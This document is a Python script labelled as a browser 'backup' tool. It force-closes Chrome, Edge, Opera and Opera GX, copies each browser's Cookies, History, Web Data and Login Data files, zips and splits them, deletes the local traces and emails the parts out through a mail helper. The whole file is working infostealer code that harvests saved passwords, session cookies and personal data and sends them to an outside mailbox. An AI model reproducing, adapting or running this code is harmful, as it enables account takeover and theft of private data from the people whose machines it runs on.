import os
import shutil
import psutil
import logging
import zipfile
from utils.email_sender import send_email

logging.basicConfig(filename="cookies.log", level=logging.DEBUG, format='%(asctime)s: %(message)s', encoding='utf-8')

def kill_browser_processes():
    browser_processes = [
        "chrome.exe",
        "msedge.exe",
        "opera.exe",
        "operagx.exe"
    ]
  
    for process_name in browser_processes:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] == process_name:
                try:
                    proc.terminate()
                    proc.wait(timeout=3)
                    logging.info(f"Terminated {process_name}.")
                except psutil.NoSuchProcess:
                    logging.error(f"Process {process_name} no longer exists.")
                except psutil.AccessDenied:
                    logging.error(f"Access denied to terminate {process_name}.")
                except Exception as e:
                    logging.error(f"Error terminating process {process_name}: {e}")

def copy_files_from_paths(browser_name, paths, file_names, base_folder):
    found_files = False
    browser_folder = os.path.join(base_folder, browser_name)

    for base_path in paths:
        if os.path.exists(base_path):
            for root, dirs, files in os.walk(base_path):
                for file_name in file_names:
                    if file_name in files:
                        found_files = True
                        original_path = os.path.join(root, file_name)
                        path_folder = os.path.basename(root)
                        path_folder_path = os.path.join(browser_folder, path_folder)
                        os.makedirs(path_folder_path, exist_ok=True)
                        new_path = os.path.join(path_folder_path, file_name)
                        try:
                            shutil.copy2(original_path, new_path)
                            logging.info(f"Copied {original_path} to {new_path}")
                        except Exception as e:
                            logging.error(f"Error copying file {original_path} to {new_path}: {e}")
        else:
            logging.info(f"Path does not exist: {base_path}")

    if not found_files:
        logging.info(f"No files found for {browser_name}, skipping folder creation.")

def create_zip_archive(archive_name, folder_to_zip):
    try:
        with zipfile.ZipFile(archive_name, 'w', zipfile.ZIP_DEFLATED) as archive:
            for root, dirs, files in os.walk(folder_to_zip):
                for file in files:
                    file_path = os.path.join(root, file)
                    archive_path = os.path.relpath(file_path, folder_to_zip)
                    archive.write(file_path, archive_path)
        logging.info(f"Created ZIP archive: {archive_name}")
        return True
    except Exception as e:
        logging.error(f"Failed to create ZIP archive {archive_name}: {e}")
        return False

def split_zip_file(zip_filename, max_size_mb):
    """Split the zip file into multiple parts if it exceeds the max_size_mb limit."""
    max_size_bytes = max_size_mb * 1024 * 1024
    part_num = 1
    part_filename = f"{zip_filename}.part{part_num}"
    
    with open(zip_filename, 'rb') as f:
        while True:
            chunk = f.read(max_size_bytes)
            if not chunk:
                break
            
            with open(part_filename, 'wb') as part_file:
                part_file.write(chunk)
            
            logging.info(f"Created part file: {part_filename}")
            
            part_num += 1
            part_filename = f"{zip_filename}.part{part_num}"

def delete_folder(folder_path):
    try:
        shutil.rmtree(folder_path)
        logging.info(f"Deleted folder: {folder_path}")
    except Exception as e:
        logging.error(f"Failed to delete folder {folder_path}: {e}")

def main():
    kill_browser_processes()

    base_folder = os.path.join(os.path.dirname(__file__), "All_Browsers")
    os.makedirs(base_folder, exist_ok=True)

    browser_paths = {
        "Chrome": [
            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default"),
            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network")
        ],
        "Edge": [
            os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default"),
            os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network")
        ],
        "Opera": [
            os.path.expandvars(r"%AppData%\Opera Software\Opera Stable\Default"),
            os.path.expandvars(r"%AppData%\Opera Software\Opera Stable\Default\Network")
        ],
        "OperaGX": [
            os.path.expandvars(r"%AppData%\Opera Software\Opera GX Stable\Network")
        ]
    }

    file_names = [
        "Cookies",
        "History",
        "Web Data",
        "Login Data"
    ]

    for browser_name, paths in browser_paths.items():
        logging.info(f"Processing {browser_name}...")
        copy_files_from_paths(browser_name, paths, file_names, base_folder)

    zip_name = "all_browsers_backup.zip"
    if create_zip_archive(zip_name, base_folder):
        delete_folder(base_folder)
        
        max_size_mb = 20  # Maximum size per part in MB
        split_zip_file(zip_name, max_size_mb)

        subject = "Backup of Browser Data"
        body = "Please find the attached ZIP file parts containing the backup of browser data."

        part_num = 1
        while True:
            part_filename = f"{zip_name}.part{part_num}"
            if not os.path.exists(part_filename):
                break
            send_email(subject, body, part_filename)
            part_num += 1

if __name__ == "__main__":
    main()